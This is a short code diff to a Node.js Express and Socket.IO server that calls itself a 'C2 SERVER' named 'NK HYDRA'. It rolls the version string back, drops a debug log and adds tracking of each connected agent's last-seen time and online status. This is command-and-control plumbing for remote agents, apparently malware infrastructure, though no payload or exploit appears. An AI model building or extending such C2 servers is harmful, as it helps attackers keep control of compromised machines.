@@ -1,5 +1,5 @@
- // TYPE: NODE.JS C2 SERVER
-// NK HYDRA v303.0 [TITAN STABLE]
+// TYPE: NODE.JS C2 SERVER
+// NK HYDRA v302.0 [TITAN STABLE]
 
 const express = require('express');
 const http = require('http');
@@ -9,7 +9,7 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v303.0', agents: agents.length }); });
+app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v302.0', agents: agents.length }); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
@@ -62,9 +62,13 @@ io.on('connection', (socket) => {
         // Relay Log immediately to UI
         io.to('ui_room').emit('agent_event', data);
         
-        // Log locally for debug
-        if (data.type === 'SUCCESS' || data.type === 'ERROR') {
-            console.log(`[<] ${data.type} from ${data.agentId}`);
+        // Update Agent Status on specific events
+        if (data.agentId) {
+             const agent = agents.find(a => a.id === data.agentId);
+             if (agent) {
+                 agent.lastSeen = Date.now();
+                 agent.status = 'Online';
+             }
         }
     });
 
@@ -87,4 +91,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v303.0 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v302.0 LISTENING ON ${PORT}`));
